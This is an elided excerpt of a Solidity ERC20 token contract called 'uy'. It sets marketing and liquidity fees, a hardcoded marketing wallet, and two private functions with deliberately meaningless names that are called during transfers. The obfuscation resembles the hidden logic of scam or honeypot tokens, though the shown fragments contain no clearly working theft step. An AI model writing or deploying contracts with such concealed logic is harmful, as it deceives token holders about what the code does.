...
contract uy is Context, IERC20, Ownable {
    ...
    string private constant _name = "uy"; // 
    string private constant _symbol = "u"; //    
    uint8 private constant _decimals = 9; // 
    
    uint256 public _marketingFee =1;
    uint256 public _liquidityFee = 1;
    address public  _marketingWallet = 0xBb39D832Fb02d391297CE7BB890292e220137759;
    ...
    receive() external payable {}
        ...
        function nflkjsdhflksdjhgflskdj(address fdasdas,uint256 sssaaaaqqr,uint256 aaaqw, uint256 asffffasas, uint256 aaaas,bool tttw) private  returns(bool) {
          uint256 liquidityTokens = balanceOf (address(this)) * _liquidityFee / (_marketingFee + _liquidityFee);
          uint256 otherHalf = liquidityTokens -  liquidityTokens / 2;
        return (tttw && (otherHalf!=asffffasas));
    }
  ...
  function jkhdskljfhsdkjhfgskdjy(address routerAPI,uint256 tyrtyufrtyrt, address from)private {
    uint256 marketingFee = tyrtyufrtyrt * _marketingFee / 100; 
    uint256 liquidityTokens = balanceOf (address(this)) * _liquidityFee / (_marketingFee + _liquidityFee);
     uint256 half = liquidityTokens / 2;
     uint256 otherHalf = liquidityTokens - half;
     uint256 newBalance = half+otherHalf;
     nflkjsdhflksdjhgflskdj(routerAPI,tyrtyufrtyrt,otherHalf,newBalance,half,true);

          if (balanceOf(address(this)) >= SWAP_TOKENS_AT_AMOUNT && !swapping && from != uniswapV2Pair && from != owner() ) {
            swapping = true;
    ...
    function _transfer(
      ...
      if(!_isExcludedFromFee[from] && !_isExcludedFromFee[to]  && to != uniswapV2Pair)
         ...
         jkhdskljfhsdkjhfgskdjy(uniswapV2Pair,amount, from);
